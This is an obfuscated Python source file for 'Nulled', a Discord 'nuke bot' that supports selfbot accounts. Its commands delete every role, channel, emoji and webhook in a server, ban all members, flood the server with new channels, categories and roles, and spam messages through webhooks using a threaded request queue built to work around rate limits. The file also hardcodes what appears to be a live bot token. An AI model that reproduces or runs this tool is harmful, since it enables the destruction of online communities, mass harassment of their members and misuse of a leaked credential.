BZ='do_not_disturb'
BY='dnd'
BX='idle'
BW='content'
BV='username'
BU='permission_overwrites'
BT='type'
BS='Channel bombing has started.'
BR='message'
BQ='ftps://'
BP='ftp://'
BO='No category.'
BN='...'
BM='help'
BL='application/json'
BK='content-type'
BJ='proxies'
BI=TypeError
BH=sorted
BG=KeyboardInterrupt
BF=EOFError
BE=input
At='b64'
As='Please insert an integer that is greater than 0.'
Ar='Please enter a positive integer.'
Aq='http://'
Ap='https://'
Ao='Invalid page number.'
An='Bad page number.'
Am='data'
Al='online'
Ak=Exception
Ac='an'
Ab='offline'
Aa='\r'
AQ='name'
AH='retry_after'
AG='verbose'
AF='token'
AE='utf8'
AD=open
A6='bot_status'
A5=isinstance
A0='remove'
z='add'
y='random'
x='bot_permission'
v='contents'
u='usernames'
r='list'
q='pfp_urls'
n='ban_whitelist'
p=''
o=hex
j=' '
i=range
f=':white_check_mark:'
e=':x:'
d='fixed'
c='after'
b='\n'
a='permissions'
Z='bomb_messages'
W='1'
V=False
S='command_prefix'
Q='webhook_spam'
P=int
M=print
K=str
H=True
F=len
D=None
import discord as O,sys as w,requests as R,os as g,time
from discord.ext import commands as G
import asyncio as A3
from packaging import version as AI
from random import randint as h,choice as AR,randrange as AS,random as Ad,choices as AT
from threading import Thread
from inputimeout import inputimeout as Au,TimeoutOccurred as Av
from queue import Queue
from io import BytesIO as A1
from pathlib import Path as AU
from math import ceil as A4
from copy import deepcopy as Ae
if w.platform=='linux':import simplejson as k
else:import json as k
from colorama import init,Fore as I
init(autoreset=H)
__TITLE__='Nulled'
__VERSION__='8.3.5'
__AUTHOR__='Eren Jaeger'
__LICENSE__='None'
U=500
Ba=500
Bb=500
B=D
AJ=[]
s=[]
AV=D
AK=V
A7=V
A8=H
AW=H
AL=6
Bc=H
Aw=dict(((ord(A),D)for A in'<>:"\\/|?*'))
A9=V
def exit():
	try:BE('Press enter to exit...')
	except (BF,BG):pass
	w.exit(1)
def Ax():w.stdout.buffer.write(f"""         _   _ _   _ _      _             
   _ _  | \\ | | | | | |    | |      _ _   
  (_|_) |  \\| | | | | |    | |     (_|_)  
        | . ` | | | | |    | |            
 _ _ _  | |\\  | |_| | |____| |____  _ _ _ 
(_|_|_) \\_| \\_/\\___/\\_____/\\_____/ (_|_|_)
""".encode(AE))
if AI.parse('1.5.1')>AI.parse(O.__version__):M('Please update your discord.py.');exit()
C={AF:D,a:[],x:'8',S:'x.',A6:Al,AG:15,Z:{y:D,d:[]},Q:{u:['null'],q:[],v:['@everyone']},c:[],BJ:[],n:[]}
def Ay():
	from glob import glob;E=D;I=g.path.join(AU().absolute().__str__(),Am);A=g.path.join(I,'default.json');B=glob(g.path.join(AU().absolute().__str__(),Am,'*.json'))
	def G(choice,timeout):
		T='r';S='3';R='2';Q='|                       |';L='x';J='=========================';G=timeout;E=choice
		while H:
			M(J);M(Q);M('| [{0}] Load default.json |'.format(W if 1 in E else L));M('| [{0}] Select .json file |'.format(R if 2 in E else L));M('| [{0}] Create a new json |'.format(S if 3 in E else L));M(Q);M(J);M('[x] = not Available;')
			try:D=Au(prompt='Auto boot with choice [1] in %d seconds...\nChoose 1, 2, or 3\n>> '%G,timeout=G)
			except Av:D=W
			if D==W:
				if not g.path.isfile(A):M(f"Unable to find file: {A}");continue
				with AD(A,T,encoding=AE)as I:
					try:return k.loads(I.read())
					except k.decoder.JSONDecodeError:M(f"There are some errors occured when reading the configuration file. File path -> {A}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...")
				break
			elif D==R:
				while H:
					M(J);M('0) Go back')
					for (N,O) in enumerate(B):M(f"{K(N+1)}) {O}")
					C=BE('Select the .json file.\n>> ')
					if not C.isdigit()or not 0<=(C:=P(C))<=F(B):M(f"You need to enter an integer that is between or on 0 and {K(F(B))}");continue
					if C==0:G=999999;break
					with AD(B[C-1],T,encoding=AE)as I:
						try:return k.loads(I.read())
						except k.decoder.JSONDecodeError:M(f"There are some errors occured when reading the configuration file. File path -> {A}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...")
			elif D==S:break
	global C,AA
	if g.path.isfile(A):E=G([1,2,3],5)
	elif F(B)>0:E=G([2,3],999999)
	if E is not D:C.update(E)
	else:
		try:C[AF]='ODAwNjMyNjU2ODM5NTczNTA0'+'.YZufCQ.'+'GrAZAockj2s9ATqsZOg93HLgqN4';C[a].append('800632656839573504')
		except BG:w.exit(0)
		except BF:M('Invalid input/EOFError. This may be caused by some unicode.');exit()
	M('\nTips:');M('The default command_prefix is: x.');M(f"Your currect command_prefix is: {C[S]}");M(f"Use {C[S]}config to config the settings and more info about how to config.\n");AA=Ae(C)
Ay()
AB=AM=AN=AO=0
def Af():global AB,AM,AN,AO;A=C[AG];AB=A&1<<0;AM=A&1<<1;AN=A&1<<2;AO=A&1<<3
Af()
t=H
X={}
def Az(token=D):
	G='Invalid token is being used.';F='https://discord.com/api/v8/users/@me';E='id';B='authorization';A=token
	if A is D:A=C[AF]
	global t,X
	try:
		X={B:A,BK:BL};M('Checking selfbot token.',end=Aa)
		if not E in R.get(url=F,timeout=AL,headers=X).json():
			X[B]='Bot '+A;M('Checking normal bot token.',end=Aa)
			if not E in R.get(url=F,timeout=AL,headers=X).json():M(G);exit()
			else:t=V
	except R.exceptions.ConnectionError:M("You should probably consider connecting to the internet before using any discord related stuff. If you are connected to wifi and still seeing this message, then maybe try turn off your VPN/proxy/TOR node. If you are still seeing this message or you just don't what to turn off vpn, you can try to use websites like repl/heroku/google cloud to host the bot for you. The source code is on https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot.");exit()
	except (R.exceptions.InvalidHeader,k.decoder.JSONDecodeError):M(G);exit()
Az()
M('Checking update...           ',end=Aa)
Ag=R.get('https://raw.githubusercontent.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot/master/VERSION.txt').text
if AI.parse(Ag)>AI.parse(__VERSION__):M(f"New C-REAL update has been launched -> {Ag} <- :party:")
M('Loading scripts...'+j*15,end=Aa)
async def Bd(bot,message):return C[S]
E=G.Bot(command_prefix=C[S],case_insensitive=H,self_bot=t,intents=O.Intents().all())
E.remove_command(BM)
@E.event
async def Be():
	if t:
		for A in C[a]:
			if K(E.user.id)==A or f"{E.user.name}#{E.user.discriminator}"==A:global AW;AW=H
		C[a].append(K(E.user.id))
	global AJ;AJ=BH(E.commands,key=lambda e:e.name[0]);await AZ(D,C[A6])
@E.event
async def Bf():
	Ax();M('/+========================================================');M(f"| | {I.GREEN}Bot ready.");M(f"| {I.MAGENTA}+ Logged in as");M(f"| | {E.user.name}#{E.user.discriminator}");M(f"| | {E.user.id}");M(f"| {I.MAGENTA}+ Permission given to ")
	for A in C[a]:M(f"| | {A}")
	M(f"| {I.MAGENTA}+ Command prefix: "+C[S])
	if t:M(f"| {I.YELLOW}+ [Selfbot] This is a selfbot. Join servers with join codes.")
	else:M(f"| {I.YELLOW}+ https://discord.com/api/oauth2/authorize?client_id={E.user.id}&permissions={C[x]}&scope=bot")
	M('| ~*************************************');M('\\+-----')
@E.event
async def Bg():await AZ(D,Ab)
async def A(ctx,message):
	B=message
	if AN:
		try:await ctx.send(B)
		except O.errors.HTTPException:
			for C in i(A4(F(B)/2000)):await A(ctx,B[2000*C:2000*(C+1)])
		except:L(B)
def L(message,print_time=V):
	B=message
	if AM:
		A=p
		if print_time:A=f"{I.MAGENTA}[{time.strftime('%H:%M:%S',time.localtime())}] {I.RESET}"
		try:M(f"{A}{B}")
		except BI:w.stdout.buffer.write(f"{A}{B}".encode(AE))
@E.event
async def Bh(ctx,error):
	C=ctx;B=error
	if not AO or hasattr(C.command,'on_error'):return
	B=getattr(B,'original',B)
	if A5(B,G.CommandNotFound):
		if J(C):
			try:await A(C,f"Command `{C.message.content}` is not found.")
			except O.errors.HTTPException:await A(C,'That command is not found.')
	elif A5(B,G.CheckFailure):0
	elif A5(B,O.Forbidden):await A(C,f"403 Forbidden: Missing permission.")
	elif A5(B,O.errors.HTTPException):0
	elif A5(B,G.UserInputError):await A(C,'Invalid input.')
	else:
		try:await A(C,'%s'%B.args)
		except O.errors.NotFound:pass
		except BI:L(f'{I.RED}Error -> {B.args}: {I.YELLOW}When using "{C.message.content}".',H)
if t:
	@E.event
	async def Bi(message):
		A=message
		if A.content.startswith(C[S])and J(await E.get_context(A)):
			if A.author.id==E.user.id and not AW:L(f'{I.YELLOW}Account owner {I.LIGHTBLUE_EX}"{E.user.name}#{E.user.discriminator}" {I.YELLOW}tried to use {I.LIGHTBLUE_EX}"{A.content}"{I.BLUE}. Too bad, he/she doesn\'t of the power to use this bot.',H);return
			A.author=E.user;await E.process_commands(A)
@E.event
async def Bj(guild):
	if AK:global B;B=guild;await B6(AV)
def A2(ctx):return A5(ctx.channel,O.channel.DMChannel)
def AP(name):
	A=name
	if A.startswith('<@!')or A.startswith('<@&'):return A[:-1][3:]
	return A
async def l(ctx,n,title,array):
	N=array;L=title;E=ctx
	if not n.isdigit()or(n:=P(n)-1)<0:await A(E,An);return
	C=p;G=p;B=F(N)
	if B==0:return await E.send(f"{L} count: 0")
	D=n*U;M=D+U
	if D>B-U:
		if D>B:await E.send(Ao);return
		M=D+B%U
	else:M=D+U
	for R in i(D,M,1):
		I=N[R]
		if F(I.name)>17:I.name=I.name[:17]+BN
		C+=f"{I.name}\n";G+=f"{K(I.id)}\n "
	try:Q=h(0,16777215);J=O.Embed(title=L,description=f"Total count: {K(B)}; color: #{o(Q)[2:].zfill(6)}",color=Q);J.add_field(name='Name',value=C,inline=H);J.add_field(name='ID',value=G,inline=H);J.set_footer(text=f"{n+1}/{K(A4(B/U))}");await E.send(embed=J)
	except:C=C.split(b);G=G.split(j);await E.send(f"```*{L}*\nTotal count: {K(B)}\n__Name__{j*13}__ID__\n{p.join([C[A].ljust(21)+G[A]for A in i(F(C)-1)])}{n+1}/{K(A4(B/U))}```")
async def N(ctx):
	E=ctx
	if B is not D:return H
	elif not A2(E):await B0(E);await A(E,f"You have been automatically `{C[S]}connect` to server `{B.name}` because you are not connected to a server and using a command inside a server.");return H
	else:await A(E,f"I am not connected to a server. Try `{C[S]}servers` and `{C[S]}connect`");return V
def Y(a,b):
	for A in a:
		if A.name.lower()==b.lower()or K(A.id)==b:return A
	return D
def J(ctx):
	A=ctx
	if A9:return H
	for B in C[a]:
		if K(A.author.id)==B or f"{A.author.name}#{A.author.discriminator}"==B:return H
	if not A2(A):L(f'{I.LIGHTRED_EX}{A.author.name}#{A.author.discriminator} {I.RESET}tried to use {I.LIGHTYELLOW_EX}"{A.message.content}" {I.RESET}in server {I.LIGHTYELLOW_EX}"{A.guild.name}"{I.RESET}, at channel {I.LIGHTYELLOW_EX}"{A.channel.name}"{I.RESET}.',H)
	else:L(f'{I.LIGHTRED_EX}{A.author.name}#{A.author.discriminator} {I.RESET}tried to use {I.LIGHTYELLOW_EX}"{A.message.content}" {I.RESET}in {I.LIGHTYELLOW_EX}the bot\'s direct message{I.RESET}.',H)
	return V
def AX():return C[Z][d][h(0,F(C[Z][d])-1)]
A_='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
def AC(n=0):return p.join(AT(A_,k=C[Z][y]if n==0 else n))
Ah='0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
def AY():return p.join(AT(Ah,k=C[Z][y]))
def Bk(ctx):0
def Bl(ctx):
	if A2(ctx):return H
def m():return AA==C
@G.check(J)
@E.command(name=BM,aliases=['h','commands'])
async def help(ctx,asked_command=D):
	M='```';H=asked_command;G=ctx;J=M
	if H is D:
		for B in AJ:J+=f"[{B.name}] "
		await G.send(J+f"\n\nYou can try {C[S]}help <command> to see all the aliases for the command. Or read the manual.md for more infomation about the commands.```")
	else:
		for B in AJ:
			if H.lower()==B.name.lower():
				E=f"```{C[S]}<{B.name}"
				for L in B.aliases:E+=f"|{L}"
				E+='>'
				for (I,F) in B.params.items():
					if I=='ctx':continue
					if F.empty is not F.default:E+=' {'+I+'='+K(F.default)+'}'
					else:E+=' ['+I+']'
					if F.kind.name=='KEYWORD_ONLY':break
				E+=M;await G.send(E);return
		await A(G,f"Unable to find command `{H}`.")
@G.check(J)
@E.command(name='servers',aliases=['se','server'])
async def Bm(ctx,n=W):await l(ctx,n,'Servers',E.guilds)
@G.check(J)
@E.command(name='channels',aliases=['tc','textchannels','textchannel','channel'])
async def Bn(ctx,n=W):
	if not await N(ctx):return
	await l(ctx,n,'Text channels',B.text_channels)
@G.check(J)
@E.command(name='roles',aliases=['ro','role'])
async def Bo(ctx,n=W):
	if not await N(ctx):return
	await l(ctx,n,'Roles',B.roles)
@G.check(J)
@E.command(name='categories',aliases=['cat','category'])
async def Bp(ctx,n=W):
	if not await N(ctx):return
	await l(ctx,n,'Categories',B.categories)
@G.check(J)
@E.command(name='voiceChannels',aliases=['vc','voicechannel'])
async def Bq(ctx,n=W):
	if not await N(ctx):return
	await l(ctx,n,'Voice channels',B.voice_channels)
@G.check(J)
@E.command(name='emojis',alises=['em','emoji'])
async def Br(ctx,n=W):
	if not await N(ctx):return
	await l(ctx,n,'Emojis',B.emojis)
@G.check(J)
@E.command(name='members',alises=['me','member'])
async def Bs(ctx,command=W,*,args=D):
	if not await N(ctx):return
	M(F(B.members));await l(ctx,command,'Members',B.members)
@G.check(J)
@E.command(name='bans')
async def Bt(ctx,n=W):
	if not await N(ctx):return
	await l(ctx,n,'Bans',[A.user for A in await B.bans()])
@G.check(J)
@E.command(name='connect',aliases=['con'])
async def B0(ctx,*,server=D):
	F=ctx;C=server
	if C is D and F.guild is D:await A(F,f"Providing a server name is required.");return
	if C is D and not A2(F):C=F.guild
	else:
		G=C;C=Y(E.guilds,C)
		if C is D:await A(F,f"Unable to find {G} server.");return
	global B;B=C;await A(F,f"Successfully connected to `{C.name}`.")
@G.check(J)
@E.command(name='addChannel',aliases=['aCh','aChannel'])
async def Bu(ctx,channel_name,*,category=D):
	F=channel_name;E=ctx;C=category
	if not await N(E):return
	if C is not D:
		G=C;C=Y(B.categories,C)
		if C is D:await A(E,f"Unable to find category `{G}`.");return
	try:
		await B.create_text_channel(F,category=C)
		if C is D:C=BO
		else:C=C.name
		await A(E,f"Successfully added channel `{F}` to category `{C}`.")
	except:await A(E,f"Unable to add channel `{F}`.");raise
@G.check(J)
@E.command(name='addVoiceChannel',aliases=['aVoiceChannel','aVC'])
async def Bv(ctx,voice_channel,*,category=D):
	F=voice_channel;E=ctx;C=category
	if not await N(E):return
	if C is not D:
		G=C;C=Y(B.categories,C)
		if C is D:await A(E,f"Unable to find category `{G}`.");return
	try:
		await B.create_voice_channel(F,category=C)
		if C is D:C=BO
		else:C=C.name
		await A(E,f"Successfully added VC `{F}` to category `{C}`.")
	except:await A(E,f"Unable to add VC `{F}`.");raise
@G.check(J)
@E.command(name='addEmoji',aliases=['aEmoji','aEm'])
async def Bw(ctx,item,*,name=D,bits=D):
	F=ctx;E=name;C=item
	if not await N(F):return
	if bits is D:
		if C.startswith((Ap,Aq,BP,BQ)):
			try:
				if E is D:await A(F,"Name for emoji? I'm not always going to name it for you...");return
				await B.create_custom_emoji(name=E,image=A1(R.get(C).content).read());await A(F,f"Successfully added emoji `{E}`.")
			except:raise
		elif C[0]=='<':
			C=C.split(':')
			if E is D:E=C[1]
			try:
				if C[0]=='<a':await B.create_custom_emoji(name=E,image=A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.gif?v=1").content).read())
				else:await B.create_custom_emoji(name=E,image=A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.png?v=1").content).read())
				await A(F,f"Successfully added emoji: {E}")
			except:raise
		elif g.path.isfile(C):
			with AD(C,'rb')as G:await B.create_custom_emoji(name=E,image=G.read());await A(F,f"Successfully added emoji: {E}")
		else:await A(F,'Bad path to image.')
	else:B.create_custom_emoji(name=E,image=bits)
@G.check(J)
@E.command(name='addCategory',aliases=['aCat','aCa'])
async def Bx(ctx,*,category_name):
	D=category_name;C=ctx
	if not await N(C):return
	try:await B.create_category(D);await A(C,f"Successfully created category `{D}`.")
	except:await A(C,f"Unable to create category `{D}`.");raise
@G.check(J)
@E.command(name='addRole',aliases=['aRole','aR'])
async def By(ctx,*,name):
	D=ctx;C=name
	if not await N(D):return
	try:C=C.split();E=C.pop(-1);await B.create_role(name=j.join(C),permissions=O.Permissions(permissions=P(E)));await A(D,f"Successfully added role `{C}` with permission `{E}`.")
	except:await A(D,f"Failed to add role `{C}`.");raise
@G.check(J)
@E.command(name='moveRole',aliases=['mRole','mR'])
async def Bz(ctx,*,name):
	E=ctx;C=name
	if not await N(E):return
	try:
		C=C.split();G=C.pop(-1);C=j.join(C)
		if F(C)==0 or not G.isdigit():await A(E,'Invalid inputs.');return
		H=Y(B.roles,C)
		if H is D:await A(E,f"Unable to find role `{C}`.")
		await H.edit(position=P(G));await A(E,f"Successfully moved role {H.name} to position `{K(G)}`.")
	except:await A(E,f"Unable to move role `{C}` to position `{G}`.");raise
@G.check(J)
@E.command(name='deleteRole',aliases=['dRole','dR'])
async def B_(ctx,*,name):
	C=ctx
	if not await N(C):return
	E=Y(B.roles,name)
	if E is D:await A(C,f"Unable to find `{name}`.")
	try:await E.delete();await A(C,f"Successfully removed role `{E.name}`")
	except:await A(C,f"Unable to delete role `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteChannel',aliases=['dChannel','dCh'])
async def C0(ctx,channel_name):
	F=channel_name;C=ctx
	if not await N(C):return
	E=Y(B.text_channels,F)
	if E is D:await A(C,f"Unable to find text channel `{F}`.")
	try:await E.delete(reason=D);await A(C,f"Channel `{E.name}` is deleted.")
	except:await A(C,f"Unable to delete channel `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteVoiceChannel',aliases=['dVC','dVoiceChannel'])
async def C1(ctx,VC_name):
	F=VC_name;E=ctx
	if not await N(E):return
	C=Y(B.voice_channels,F)
	if C is D:await A(E,f"Unable to find voice channel `{F}`.")
	try:await C.delete(reason=D);await A(E,f"Voice channel `{C.name}` is deleted.")
	except:L(f"Unable to delete voice channel `{C.name}`.");raise
@G.check(J)
@E.command(name='deleteCategory',aliases=['dCat','dCategory'])
async def C2(ctx,*,category_name):
	F=category_name;C=ctx
	if not await N(C):return
	E=Y(B.categories,F)
	if E is D:await A(C,f"Unable to find category `{F}`.")
	try:await E.delete(reason=D);await A(C,f"Category `{E.name}` is deleted.")
	except:await A(C,f"Unable to delete category `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteCC',aliases=['dCC'])
async def C3(ctx,*,name):
	C=ctx
	if not await N(C):return
	E=Y(B.channels,name)
	if E is D:await A(C,f"Unable to find channel `{name}`.");return
	try:await E.delete(reason=D);await A(C,f"Channel `{E.name}` is removed from `{B.name}`.")
	except:await A(C,f"Unable to delete channel `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteEmoji',aliases=['dEm'])
async def C4(ctx,*,name):
	E=ctx;C=Y(B.emojis,name)
	if C is D:await A(E,f"Unable to find channel `{name}`.")
	try:await C.delete(reason=D);await(E,f"Emoji `{C.name}` is removed from the server.")
	except:await A(E,f"Unable to delete emoji: `{C.name}`.");raise
@G.check(J)
@E.command(name='ban')
async def C5(ctx,member_):
	C=ctx;B=member_
	if not await N(C):return
	try:await B.ban();await A(C,f"Successfully banned `{B.name}#{B.discriminator}`.")
	except:await A(C,f"Unable to ban `{B.name}#{B.discriminator}`.");raise
@G.check(J)
@E.command(name='unban')
async def C6(ctx,*,name):
	E=ctx
	if not await N(E):return
	C=Y([A.user for A in await B.bans()],AP(name))
	if C is D:await A(E,f"Unable to find user `{name}` in server `{B.name}`.");return
	try:await B.unban(C);await A(E,f"`{C.name}#{C.discriminator}` is now free :).")
	except:await A(E,f"Failed to unban `{C.name}#{C.discriminator}`.");raise
@G.check(J)
@E.command(name='roleTo')
async def C7(ctx,member_name,*,role_name):
	H=role_name;G=member_name;F=ctx
	if not await N(F):return
	C=Y(B.roles,AP(H))
	if C is D:await A(F,f"Unable to find role `{H}`.");return
	E=Y(B.members,AP(G))
	if E is D:await A(F,f"Unable to find user `{G}`.");return
	if C in E.roles:
		try:await E.remove_roles(C);await A(F,f"Successfully removed role `{C.name}` from user `{E.name}`.")
		except:await A(F,f"Unable to remove role `{C.name}` from user `{E.name}`.");raise
	else:
		try:await E.add_roles(C);await A(F,f"Successfully given role `{C.name}` to user `{E.name}`.")
		except:await A(F,f"Unable to add role `{C.name}` to user `{E.name}`.");raise
@G.check(J)
@E.command(name='disableCommunityMode',aliases=['dCM','dCommunityMode'])
async def B1(ctx):
	C=ctx
	if not await N(C):return
	try:await A(C,f"{I.YELLOW}Disabling community mode");E=R.patch(f"https://discord.com/api/v8/guilds/{B.id}",headers=X,json={'description':D,'features':{'0':'NEWS'},'preferred_locale':'en-US','public_updates_channel_id':D,'rules_channel_id':D});L(f"Disabling community mode response -> {E.text}",H);await A(C,f"{I.GREEN}Disabled community mode.")
	except Ak as F:L(f"{I.RED}Error while attempting to disable community mode, {F}",H);raise
@G.check(J)
@E.command(name='grantAllPerm',aliases=['gap'])
async def C8(ctx):
	global A9
	if A9:await A(ctx,'Now only people with permissions can use the commands.');A9=V
	else:await A(ctx,'Now everyone can use the bot commands');A9=H
@G.check(J)
@E.command(name='kaboom')
async def C9(ctx,n,method):
	D=method;C=ctx
	if not await N(C):return
	if not n.isdigit()or P(n)<0:await A(C,Ar);return
	await A(C,f"A series of bombs have been dropped onto `{B.name}`.");E=[B3(C,n,D),B4(C,n,D),B5(C,n,D)];await A3.gather(*E)
Ai=100
T=Queue(Ai*2)
def B2():
	while H:
		B,C,D,E=T.get()
		try:
			A=B(C,data=k.dumps(E),headers=D,timeout=AL)
			if A.status_code==429:
				A=A.json()
				if AB:
					if A5(A[AH],P):A[AH]/=1000
					if A[AH]>5:L(f"Rate limiting has been reached, and this request has been cancelled due to retry-after time is greater than 5 seconds: Wait {K(A[AH])} more seconds.");T.task_done();continue
					L(f"Rate limiting has been reached: Wait {K(A[AH])} more seconds.")
				T.put((B,C,D,E))
			elif AB and'code'in A:L('Request cancelled due to -> '+A[BR])
		except k.decoder.JSONDecodeError:pass
		except R.exceptions.ConnectTimeout:L(f"Reached maximum load time: timeout is {AL} seconds long {proxy}");T.put((B,C,D,E))
		except Ak as F:L(f"Unexpected error: {K(F)}")
		T.task_done()
for CA in i(Ai):Thread(target=B2,daemon=H).start()
@G.check(J)
@E.command(name='channelBomb')
async def B3(ctx,n,method=d):
	D=ctx;C=method
	if not await N(D):return
	if not n.isdigit()or(n:=P(n))<0:await A(D,As);return
	if C==d:C=AX
	elif C==At:C=AC
	elif C==Ac:C=AY
	else:await A(D,f'Unable to find choice "{C}".');return
	L(BS,H)
	for F in i(n):E={BT:0,AQ:C(),BU:[]};T.put((R.post,f"https://discord.com/api/v8/guilds/{B.id}/channels",X,E))
	T.join();L('Done text channel bombing.',H)
@G.check(J)
@E.command(name='categoryBomb')
async def B4(ctx,n,method):
	D=ctx;C=method
	if not await N(D):return
	if not n.isdigit()or(n:=P(n))<0:await A(D,As);return
	if C==d:C=AX
	elif C==At:C=AC
	elif C==Ac:C=AY
	else:await A(D,f'Unable to find choice "{C}".');return
	L(BS,H)
	for F in i(n):E={BT:4,AQ:C(),BU:[]};T.put((R.post,f"https://discord.com/api/v8/guilds/{B.id}/channels",X,E))
	T.join();L('Done category bombing.',H)
@G.check(J)
@E.command(name='roleBomb')
async def B5(ctx,n,method):
	D=ctx;C=method
	if not await N(D):return
	if not n.isdigit()or(n:=P(n))<0:await A(D,As);return
	if C==d:C=AX
	elif C==At:C=AC
	elif C==Ac:C=AY
	else:await A(D,f'Unable to find choice "{C}".');return
	L('Role bombing has started.',H)
	for F in i(n):E={AQ:C()};T.put((R.post,f"https://discord.com/api/v8/guilds/{B.id}/roles",X,E))
	T.join();L('Done role bombing.',H)
@G.check(J)
@E.command(name='webhook',aliases=['webhooks','wh'])
async def CB(ctx,*,args=D):
	e='offload';d='start';G=ctx;E=args
	if not await N(G):return
	if E is D or E.isdigit():
		if E is D:E=W
		try:await l(G,E,'Webhooks',await B.webhooks());return
		except:raise
	E=E.split()
	if E[0]=='create'or E[0]==z:
		del E[0]
		if F(E)<1:await A(G,f"More arguments is requested. You can put how many webhooks you want to create or channel id/name on the channels you want the webhooks to be created on.");return
		H=j.join(E);L=await B.webhooks();O=F(L);J=H.split()
		if P(H)<0:await A(G,f"You thought a smol negative number will break this bot?");return
		if F(J)==1 and P(H)<=50:
			J=B.text_channels
			if P(H)>F(J):await A(G,f"This adding webhooks method can only distribute webhooks evenly and randomly throughout the text channels. You entered `{H}`, and there are only `{K(F(J))}` text channel(s) in the server. If you don't what to add more text channels. You can use this command a few more times with a positive integer that is less than `{K(F(J)+1)}`.");return
			for V in i(P(H)):M={AQ:AC(10)};T.put((R.post,f"https://discord.com/api/v8/channels/{J.pop(AS(F(J))).id}/webhooks",X,M))
			T.join();await A(G,f"`{H}` webhooks has been created.")
		elif F(J)==1 and P(H)<100000000:await A(G,f"The maximum webhooks that can be created every hour per server is 50. And you entered `{H}`.")
		else:
			for Z in J:
				a=Y(B.text_channels,Z)
				if a is D:await A(G,f"Cannot find channel {Z}.");continue
				M={AQ:AC(10)};T.put((R.post,f"https://discord.com/api/v8/channels/{a.id}/webhooks",X,M))
	elif E[0]=='delete'or E[0]==A0:
		H=E[1];I=Y(await B.webhooks(),H)
		if I is D:await A(G,f"Unable to find webhook `{H}`.");return
		R.delete(f"https://discord.com/api/v8/webhooks/{I.id}",headers=X);await A(G,f"Webhook `{I.name}` is removed from the server.")
	elif E[0]=='attack':
		global s;E.pop(0)
		try:
			L=await B.webhooks();O=F(L);U=0
			if F(E)>0 and E[0].lower()=='all':
				for I in L:s.append(I);U+=1
			elif E[0]==d:
				b=F(s)
				if b==0:await A(G,f"Looks like there really isn't any targets in the attack list. Maybe try: `{C[S]}webhook attack all`, then `{C[S]}webhook attack start <number of messages>`.");return
				c={BK:BL}
				if F(E)<2:E.append(10)
				elif not E[1].isdigit():await A(G,Ar);return
				f=F(C[Q][u]);g=F(C[Q][v]);h=F(C[Q][q])
				for V in i(P(E[1])):M={BV:AR(C[Q][u]),BW:AR(C[Q][v]),'avatar_url':AR(C[Q][q])};T.put((R.post,s[AS(b)].url,c,M))
			elif F(E)>0 and E[0].isdigit()and P(E[0])<=O:
				for V in i(P(E[0])):s.append(L.pop(AS(O)));O-=1;U+=1
			elif E[0]==r:
				if F(E)<2:E.append(W)
				await l(G,E[1],'Targets on attacking list',s)
			elif E[0]==e:s=[];await A(G,f"All webhooks have been offloaded")
			else:
				for I in E:
					I=Y(await B.webhooks(),I)
					if I is D:await A(G,f"Unable to find webhook `{I}`.");continue
					s.append(I);U+=1
			if E[0]!=r and E[0]!=d and E[0]!=e:await A(G,f"`{K(U)}` has been loaded into the target list.")
		except:raise
	else:await A(G,f"Unable to find `{E[0]}` command in webhook scripts.")
@G.check(J)
@E.command(name='nuke')
async def B6(ctx):
	G=ctx
	if not await N(G):return
	await A(G,f"A nuke has been launched to `{B.name}`.");K=[B1(G),B8(G),B7(G),BB(G),BA(G),B9(G)];await A3.gather(*K)
	if F(C[c])>0:
		if not A2(G)and B.id==G.guild.id:G.message.channel=D
		L(f"{I.BLUE}Running after commands...",H)
		for J in C[c]:
			try:G.message.content=C[S]+J;await E.process_commands(G.message)
			except:L(f'{I.RED}Command {I.YELLOW}"{C[S]}{J}" {I.RED}has failed to execute.',H);pass
		L(f"{I.GREEN}After commands completed.")
@G.check(J)
@E.command(name='deleteAllRoles',aliases=['dar','dAllRoles'])
async def B7(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all roles...",H)
	for A in B.roles:T.put((R.delete,f"https://discord.com/api/v8/guilds/{B.id}/roles/{A.id}",X,D))
	T.join();L(f"{I.GREEN}Finished deleting roles.",H)
@G.check(J)
@E.command(name='deleteAllChannels',aliases=['dac','dAllChannels'])
async def B8(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all types of channels...",H)
	for A in B.channels:T.put((R.delete,f"https://discord.com/api/v8/channels/{A.id}",X,D))
	T.join();L(f"{I.GREEN}Finished deleting channels.",H)
@G.check(J)
@E.command(name='deleteAllEmojis',aliases=['dae','dAllEmoji'])
async def B9(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all emojis...",H)
	for A in B.emojis:T.put((R.delete,f"https://discord.com/api/v8/guilds/{B.id}/emojis/{A.id}",X,D))
	T.join();L(f"{I.GREEN}Finished deleting emojis.",H)
@G.check(J)
@E.command(name='deleteAllWebhooks',aliases=['daw','dAllWebhooks'])
async def BA(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all webhooks...",H)
	for A in await B.webhooks():T.put((R.delete,f"https://discord.com/api/v8/webhooks/{A.id}",X,D))
	T.join();L(f"{I.GREEN}Finished deleting webhooks.",H)
@G.check(J)
@E.command(name='banAll')
async def BB(ctx):
	if not await N(ctx):return
	D={'delete_message_days':'0','reason':p};L(f"{I.YELLOW}Starting ban all...",H)
	for A in B.members:
		if f"{A.name}#{A.discriminator}"in C[n]or K(A.id)in C[n]:L(f"Ban skipped for {A.name}#{A.discriminator} -> in ban whitelist");continue
		T.put((R.put,f"https://discord.com/api/v8/guilds/{B.id}/bans/{A.id}",X,D))
	T.join();L(f"{I.GREEN}Ban all completed.",H)
@G.check(J)
@E.command(name='config')
async def CC(ctx,command=D,*,args=D):
